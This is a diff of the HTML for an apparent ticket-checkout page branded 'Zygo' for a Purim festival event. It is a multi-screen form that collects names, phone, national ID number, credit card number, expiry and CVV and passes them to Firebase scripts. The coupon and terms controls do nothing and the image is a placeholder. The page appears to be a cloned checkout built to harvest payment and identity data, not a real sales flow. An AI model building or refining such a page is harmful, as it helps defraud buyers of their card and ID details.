@@ -1,5 +1,5 @@
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Zygo</title>
   <style>
     body {
@@ -22,6 +22,7 @@
       width: 100%;
       padding: 10px;
       margin-bottom: 12px;
+      box-sizing: border-box;
     }
 
     button {
@@ -544,12 +545,7 @@
 </head>
 
 <body>
-  <h1>Enter Details</h1>
-
   <form id="nameForm">
-    <input type="text" id="firstName" placeholder="First Name" required><br><br>
-    <input type="text" id="lastName" placeholder="Last Name" required><br><br>
-
     <!-- מסך 1 – בחירת כרטיס -->
     <div class="screen active" id="screen1">
       <div class="s1-wrap">
@@ -561,10 +557,8 @@
         </div>
 
         <div class="s1-event">
-          <!-- ✅ שינוי תמונה בקלות: רק מחליפים src -->
           <img class="s1-img" id="eventImage" src="YOUR_IMAGE_URL_HERE" alt="תמונת מסיבה">
           <div>
-            <!-- ✅ שינוי שם בקלות: רק מחליפים טקסט כאן -->
             <div class="s1-title" id="eventName">EXPO LAND / PURIM FESTIVAL</div>
             <div class="s1-meta">📅 March 5th 2026, 23:00</div>
           </div>
@@ -572,7 +566,6 @@
 
         <div class="s1-card">
           <div class="s1-card-top">
-            <!-- UI כמות (לא משנה לוגיקה) -->
             <div class="s1-qty" aria-label="כמות">
               <div class="btn">+</div>
               <div class="num">1</div>
@@ -587,7 +580,6 @@
               </div>
             </div>
 
-            <!-- שומר בדיוק על name/value כדי שהלוגיקה תישאר זהה -->
             <div style="width:100%; margin-top: 10px;">
               <label class="s1-radio">
                 <input type="radio" name="cardType" value="regular" required>
@@ -609,15 +601,12 @@
           </div>
         </div>
 
-        <!-- אותו כפתור/לוגיקה בדיוק -->
         <div class="s1-actions">
           <button type="button" onclick="nextScreen(1)">התקדם – ₪ 220.00</button>
         </div>
 
       </div>
     </div>
-
-    <input type="email" id="email" placeholder="Email" required><br><br>
 
     <!-- מסך 2 – פרטים אישיים -->
     <div class="screen" id="screen2">
@@ -640,7 +629,7 @@
             </div>
           </div>
 
-          <!-- אותם שדות/IDs שלך בדיוק -->
+          <!-- ✅ כל שדה מופיע פעם אחת בלבד -->
           <div class="s2-grid">
             <input type="number" id="phoneNumber" placeholder="Phone Number" required>
             <input type="text" id="firstName" placeholder="First Name" required>
@@ -656,22 +645,8 @@
               <option value="other">Other</option>
             </select>
 
-            <input type="date" id="birthDate" required>
-            <input type="text" id="instagram" placeholder="Instagram">
-
-            <select id="gender" required>
-              <option value="">Gender</option>
-              <option value="male">Male</option>
-              <option value="female">Female</option>
-              <option value="other">Other</option>
-            </select>
-            <input type="number" id="ID" placeholder="ID" required>
-
             <input type="text" id="instagram" placeholder="Instagram">
             <input type="number" id="ID" placeholder="ID" required>
-
-            <input type="number" id="creditCardNumber" placeholder="Credit Card Number" required>
-            <div></div>
           </div>
 
           <div class="s2-note">
@@ -680,7 +655,6 @@
           </div>
         </div>
 
-        <!-- אותם כפתורים/לוגיקה בדיוק -->
         <div class="s2-actions">
           <button type="button" class="secondary back" onclick="prevScreen(2)">חזור</button>
           <button type="button" class="primary" onclick="nextScreen(2)">הבא - ₪ 220.00</button>
@@ -688,8 +662,6 @@
 
       </div>
     </div>
-
-    <input type="text" id="expire" placeholder="Expire (MM/YY)" required><br><br>
 
     <!-- מסך 3 – תשלום -->
     <div class="screen" id="screen3">
@@ -727,13 +699,11 @@
         </div>
 
         <div class="s3-coupon">
-          <!-- שומר על אותו id שלך -->
           <input type="text" id="coupon" placeholder="קוד קופון">
           <button type="button">החל</button>
         </div>
 
         <div class="s3-checks">
-          <!-- שומר על אותו id שלך -->
           <label>
             אני מאשר את תנאי השימוש <a href="#" onclick="return false;">תקנון</a>
             <input type="checkbox" id="terms" required>
@@ -747,14 +717,13 @@
 
         <div class="s3-paycard">
           <div class="s3-paygrid">
-            <!-- שומר על אותם ids שלך בדיוק -->
+            <!-- ✅ כרטיס אשראי מופיע רק כאן -->
             <input class="full" type="number" id="creditCardNumber" placeholder="Credit Card Number" required>
             <input type="text" id="expire" placeholder="Expire (MM/YY)" required>
             <input type="number" id="cvv" placeholder="CVV" required>
           </div>
 
           <div class="s3-actions">
-            <!-- אותו כפתור submit שלך (לוגיקה זהה) -->
             <button type="submit">שלם ₪ 220</button>
           </div>
         </div>
@@ -766,7 +735,6 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
-  <!-- ניווט בין מסכים (לוגיקה זהה) -->
   <script>
     function nextScreen(current) {
       document.getElementById(`screen${current}`).classList.remove("active");
@@ -778,6 +746,5 @@
     }
   </script>
 
-  <!-- הלוגיקה שלך -->
   <script src="firebase.js" defer></script>
 </body>
